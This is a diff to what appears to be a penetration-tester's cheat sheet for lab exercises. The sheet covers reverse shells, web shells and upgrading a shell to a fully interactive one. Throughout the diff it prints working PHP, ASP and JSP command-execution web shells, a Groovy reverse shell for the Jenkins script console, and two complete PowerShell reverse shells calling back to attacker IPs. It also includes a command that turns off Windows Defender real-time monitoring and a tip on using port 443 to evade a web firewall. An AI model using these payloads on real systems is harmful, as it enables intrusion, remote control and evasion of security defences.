@@ -1,12 +1,16 @@
 ! Use 443 port to evade WAF.
 
+##### Upgrade shell to fully interactive:
+```bash
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+CTRL+Z
+stty raw -echo
+fg
+export TERM=xterm
+```
+
 #### Cheatsheet
 https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/
-
-##### Upgrade shell:
-```bash
-python -c 'import pty; pty.spawn("/bin/bash")'
-```
 
 #### PHP
 https://github.com/Wh1ter0sEo4/reverse_shell_php/blob/main/reverse_shell.php
@@ -15,22 +19,20 @@ https://github.com/Wh1ter0sEo4/reverse_shell_php/blob/main/reverse_shell.php
 <?php system($_REQUEST["cmd"]); ?>
 ```
 
-
 ##### Java:
 https://alionder.net/jenkins-script-console-code-exec-reverse-shell-java-deserialization/
 
-ASP:
+##### ASP:
 ```asp
 <% eval request("cmd") %>
 ```
 
-JSP:
-
+##### JSP:
 ```jsp
 <% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
 ```
 
-Groovy (jenkins console /script):
+##### Groovy (jenkins console /script):
 ```Groovy
 String host="10.10.15.232";
 int port=8000;
@@ -66,24 +68,15 @@ powershell (run from cmd.exe):
 powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
 ```
 
-Where to upload web shell:
-
-| Web Server | Default Webroot        |
-| ---------- | ---------------------- |
-| `Apache`   | /var/www/html/         |
-| `Nginx`    | /usr/local/nginx/html/ |
-| `IIS`      | c:\inetpub\wwwroot\|   |
-| `XAMPP`    | C:\xampp\htdocs\|      |
-
 ### Windows
 
 Disable AV to allow running shell from admin's powershell:
 
-```powershell-session
+```powershell
 PS C:\Users\htb-student> Set-MpPreference -DisableRealtimeMonitoring $true
 ```
 
-```cmd-session
+```cmd
 powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
 ```
 
